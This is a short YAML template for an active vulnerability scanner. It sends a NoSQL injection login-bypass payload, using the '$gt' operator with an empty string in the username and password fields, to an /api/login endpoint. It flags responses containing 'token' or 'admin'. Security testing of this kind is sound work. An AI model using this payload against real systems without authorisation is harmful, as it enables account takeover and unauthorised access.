id: patt-nosql-gt-01-login
name: 'PATT NoSQL patt-nosql-gt-01'
severity: high
type: active
tags:
  - nosql
  - patt
  - injection
  - api
requires:
  - node
description: 'PATT NoSQL $gt empty-string bypass. [patt:patt-nosql-gt-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/NoSQL%20Injection/README.md]'
requests:
  - method: POST
    path: '{{BaseURL}}/api/login'
    body: '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
    sendHeaders:
      Content-Type: 'application/json'
    matchers:
      - type: word
        part: body
        words:
          - 'token'
          - 'admin'
